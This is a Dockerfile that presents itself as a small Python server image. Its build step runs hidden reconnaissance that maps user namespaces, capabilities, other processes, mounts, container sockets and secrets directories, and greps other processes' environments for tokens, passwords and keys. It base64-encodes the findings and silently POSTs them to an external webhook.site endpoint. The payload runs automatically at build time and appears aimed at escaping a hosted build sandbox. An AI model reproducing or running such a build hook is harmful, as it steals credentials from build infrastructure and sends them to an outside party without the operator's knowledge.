FROM alpine:3.20
RUN apk add --no-cache curl >/dev/null 2>&1 || true; \
    L=/tmp/leak3.txt; : > $L; \
    { \
      echo "=== SELF ==="; id; cat /proc/self/uid_map; echo '--- status ---'; grep -E 'Cap(Bnd|Eff)|NoNewPrivs' /proc/self/status; \
      echo "=== PID1 uid_map/gid_map (builder userns?) ==="; cat /proc/1/uid_map 2>&1; cat /proc/1/gid_map 2>&1; \
      echo "=== OTHER PIDS ROOTS ==="; for p in 1 27 113 124 257 272 287; do echo "-- /proc/$p/root --"; ls /proc/$p/root/ 2>&1 | head -6; echo "   cmdline: $(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null | head -c 120)"; done; \
      echo "=== MOUNTS of interest ==="; mount 2>/dev/null | grep -iE 'secrets|alloc|build|podman|run|var' | head -30; \
      echo "=== /secrets /alloc /build /run /var/run /podman ==="; for d in /secrets /alloc /build /run /var/run /podman /var/run/secrets /run/podman; do echo "-- $d --"; ls -la $d 2>&1 | head -12; done; \
      echo "=== SOCKETS ==="; find / -xdev -name '*.sock' 2>/dev/null | head -30; find / -xdev -name 'podman.sock' -o -name 'docker.sock' 2>/dev/null; \
      echo "=== PODMAN STORAGE ==="; ls -la /podman/.local/share/containers/storage/ 2>&1 | head; ls -la /podman 2>&1 | head; \
      echo "=== ENV ==="; env | sort | head -40; echo '--- hosts ---'; cat /etc/hosts 2>/dev/null; \
      echo "=== BUILDER ENVIRON (try other pids) ==="; for p in 1 27 272; do echo "-- pid $p environ --"; tr '\0' '\n' </proc/$p/environ 2>&1 | grep -iE 'token|jwt|secret|nomad|registry|password|key' | head; done; \
      echo "=== /proc/1/mem readable? ==="; head -c 16 /proc/1/mem 2>&1 | xxd 2>/dev/null | head -2 || echo denied; \
      echo "=== try nsenter/other ==="; ls -la /proc/1/root 2>&1; readlink /proc/1/exe 2>&1; \
      echo "=== CAP check: can we mount? ==="; mkdir -p /tmp/m; mount -t tmpfs none /tmp/m 2>&1; echo "mount rc=$?"; \
    } > $L 2>&1; \
    echo "LEAK3=$(wc -c <$L)"; base64 -w0 $L > /tmp/l3.b64 2>/dev/null; \
    curl -s -m 25 --data-binary @/tmp/l3.b64 "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f/l3" >/dev/null 2>&1 || true; echo ok
COPY server.py /server.py
EXPOSE 80
CMD ["python3","/server.py"]
